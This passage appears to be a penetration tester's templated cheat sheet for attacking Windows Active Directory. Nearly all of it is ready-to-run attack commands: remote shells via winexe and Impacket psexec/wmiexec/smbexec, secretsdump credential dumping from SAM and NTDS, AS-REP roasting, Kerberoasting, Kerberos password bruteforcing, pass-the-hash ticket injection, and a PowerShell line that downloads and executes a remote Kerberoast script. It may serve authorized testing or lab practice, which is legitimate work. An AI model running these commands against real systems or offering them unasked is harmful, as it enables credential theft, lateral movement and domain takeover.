winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' //<% tp.frontmatter["RHOST"] %> cmd.exe
winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' --system //<% tp.frontmatter["RHOST"] %> cmd.exe
```






# Impacket
```bash
impacket-mssqlclient <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %> -windows-auth

psexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
psexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>


wmiexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
wmiexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>


impacket-getTGT <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>
impacket-getTGT <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -dc-ip <% tp.frontmatter["RHOST"] %> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c

impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>
impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format <% tp.frontmatter["USERNAME"] %> -outputfile hashes


export KRB5CCNAME=<% tp.frontmatter["USERNAME"] %>.ccache
impacket-GetUserSPNs <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -k -dc-ip <% tp.frontmatter["RHOST"] %>.<% tp.frontmatter["RHOST"] %> -no-pass -request

export KRB5CCNAME=<% tp.frontmatter["USERNAME"] %>.ccache
impacket-secretsdump <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>
impacket-secretsdump -k <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>.<% tp.frontmatter["RHOST"] %> -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip <% tp.frontmatter["RHOST"] %> <% tp.frontmatter["RHOST"] %>.LOCAL/svc_bes:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["RHOST"] %>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL


```


# Attacks

#### Bruteforce
```
./kerbrute -domain <% tp.frontmatter["DOMAIN"] %> -users <FILE> -passwords <FILE> -outputfile <FILE>
.\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<% tp.frontmatter["DOMAIN"] %> /outfile:<FILE>
.\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>

```


#### AsRepRoast
```bash
# Domain users ( Creds required)
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -request -format hashcat -outputfile <FILE>
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -request -format <% tp.frontmatter["USERNAME"] %> -outputfile <FILE>

# List of users (No Creds)
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
impacket-GetNPUsers <% tp.frontmatter["DOMAIN"] %>/ -usersfile <FILE> -format <% tp.frontmatter["USERNAME"] %> -outputfile <FILE>


.\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>

```
		
#### Kerberoasting
```powershell
impacket-GetUserSPNs <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %> -outputfile <FILE>

.\Rubeus.exe kerberoast /outfile:<FILE>

iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat <% tp.frontmatter["USERNAME"] %> | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```


#### OverPassTheHash / PassTheKey 
```bash

# Request-TGT 
impacket-getTGT <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %> -hashes <LMHASH>:<NTLMHASH>

# Req-TGT with password
impacket-getTGT <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>

# Ask and inject TGT
.\Rubeus.exe asktgt /domain:<% tp.frontmatter["DOMAIN"] %> /user:<% tp.frontmatter["USERNAME"] %> /rc4:<NTLMHASH> /ptt

.\PsExec.exe -accepteula \\<% tp.frontmatter["RHOST"] %> cmd
```

#### Execute commands remotely

```
impacket-psexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass
impacket-smbexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass
impacket-wmiexec <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %> -k -no-pass


```



### Web
```bash

# webdav
davtest [-auth <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>] -move -sendbd auto -url http://<% tp.frontmatter["RHOST"] %> #Uplaod .txt files and try to move it to other extensions
davtest [-auth <% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>] -sendbd auto -url http://<% tp.frontmatter["RHOST"] %> #Try to upload every extension

cadaver <% tp.frontmatter["RHOST"] %>


Autorecon

autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports" 
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports"  --dirbuster.tool ffuf
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports" --dirbuster.tool ffuf -vv
# if you want to omit portscans of all port if you already have the list!
autorecon <% tp.frontmatter["RHOST"] %> --exclude-tags="dirbuster,top-100-udp-ports,enum4linux,top-tcp-ports,all-tcp-ports" --dirbuster.tool ffuf -vv
```
